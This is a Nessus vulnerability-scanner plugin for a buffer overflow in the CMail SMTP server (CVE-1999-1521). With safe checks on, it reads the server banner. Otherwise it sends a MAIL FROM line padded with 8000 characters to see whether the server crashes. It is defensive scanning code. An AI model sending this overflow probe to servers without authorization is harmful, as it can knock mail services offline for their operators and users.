#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10047);
 script_bugtraq_id(633);
 script_cve_id("CVE-1999-1521");
 script_version ("$Revision: 1.27 $");
 
 name["english"] = "CMail's MAIL FROM overflow";
 name["francais"] = "Dépassement de buffer dans CMail suite à la commande MAIL FROM";
 script_name(english:name["english"],
 	     francais:name["francais"]);
 
 desc["english"] = "
There seem to be a buffer overflow in the remote SMTP server
when the server is issued a too long argument to the 'MAIL FROM'
command, like :

	MAIL FROM: AAA[...]AAA@nessus.org
	
Where AAA[...]AAA contains more than 8000 'A's.

This problem may allow an attacker to prevent this host
to act as a mail host and may even allow him to execute
arbitrary code on this system.


Solution : Contact your vendor for a patch

Risk factor : High";


 desc["francais"] = "
Il semble y avoir un dépassement de buffer dans le
serveur SMTP distant lorsque celui-ci reçoit un
argument trop long a la commande 'MAIL FROM' tel
que :

	MAIL FROM : AAAA[...]AAA@nessus.org
	
Ou AAA[...]AAAA contient plus de 8000 'A's.

Ce problème peut permettre à un pirate d'empecher
cette machine d'agir comme un serveur de mail, et
peut meme lui permettre d'executer du code arbitraire
sur ce système.


Solution : informez votre vendeur de cette 
vulnérabilité et attendez un patch.

Facteur de risque : Elevé";

 script_description(english:desc["english"],
 	 	    francais:desc["francais"]);
		    
 
 summary["english"] = "Overflows a buffer in the remote mail server"; 
 summary["francais"] = "Dépassemement de buffer dans le serveur de mail distant";
 script_summary(english:summary["english"],
 		 francais:summary["francais"]);
 
 script_category(ACT_MIXED_ATTACK); # mixed
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
 		  francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 
 family["english"] = "SMTP problems";
 family["francais"] = "Problèmes SMTP";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "smtpserver_detect.nasl", "tfs_smtp_overflow.nasl");
 script_exclude_keys("SMTP/wrapped","SMTP/3comnbx");
 script_require_ports("Services/smtp", 25);
 exit(0);
}

#
# The script code starts here
#

include("smtp_func.inc");
port = get_kb_item("Services/smtp");
if(!port)port = 25;
if (get_kb_item('SMTP/'+port+'/broken')) exit(0);

if(safe_checks())
{
 banner = get_smtp_banner(port:port);
  
  if(banner)
  {
  if(egrep(pattern:"CMail Server Version: 2\.[0-4]",
  	  string:banner))
	  {
	   alrt  = 
"The remote CMail SMTP server is vulnerable to a buffer
overflow that may allow anyone to execute arbitrary code
on this host.

*** Nessus reports this vulnerability using only
*** information that was gathered. Use caution
*** when testing without safe checks enabled.

Solution : Upgrade to version 2.5 or newer
Risk factor : High";

	  security_hole(port:port, data:alrt);
	  }
  }
  exit(0);
 }



if(get_port_state(port))
{
 key = get_kb_item(string("SMTP/", port, "/mail_from_overflow"));
 if(key)exit(0); 
 soc = open_sock_tcp(port);
 if(soc)
 {
 data = smtp_recv_banner(socket:soc);
 crp = string("HELO example.com\r\n");
 send(socket:soc, data:crp);
 data = recv_line(socket:soc, length:1024);
 if("250 " >< data)
 {
 crp = string("MAIL FROM: ", crap(8000), "@", get_host_name(), "\r\n");
 send(socket:soc, data:crp);
 buf = recv_line(socket:soc, length:1024);
 if(!buf){
  close(soc);
  soc = open_sock_tcp(port);
  if(soc) s = smtp_recv_banner(socket:soc);
  else s = NULL;
  
  if(!s) security_hole(port);
  }
 }
 close(soc);
 }
}
